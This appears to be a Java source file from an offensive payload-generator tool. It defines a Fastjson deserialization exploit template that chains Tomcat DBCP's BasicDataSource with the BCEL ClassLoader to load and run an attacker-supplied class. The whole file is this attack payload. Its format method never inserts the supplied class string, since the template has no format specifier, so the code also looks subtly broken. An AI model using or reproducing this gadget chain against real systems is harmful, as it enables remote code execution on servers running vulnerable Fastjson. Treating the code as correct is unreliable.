package com.ding0x0.fastjson;

import com.ding0x0.Payload;

public class BCELPayload implements Payload {

    public String bcel = "";
    public String template = "[+] dbcp" +
            "   {\n" +
            "       {\n" +
            "           \"x\":{\n" +
            "                   \"fwname\":{\n" +
            "                   \"@type\":\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n" +
            "                   \"driverClassLoader\":{\n" +
            "                       \"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
            "                   },\n" +
            "                   \"driverClassName\":\"$$BCEL$$\"\n" +
            "               }\n" +
            "           }\n" +
            "       }:\"x\"\n" +
            "   }";

    public BCELPayload(String bcel){
        this.bcel = bcel;
    }

    public BCELPayload(){

    }

    @Override
    public String format(){
        if (this.bcel.equals("")) {
            return this.template;
        }
        return String.format(this.template, this.bcel);
    }
}
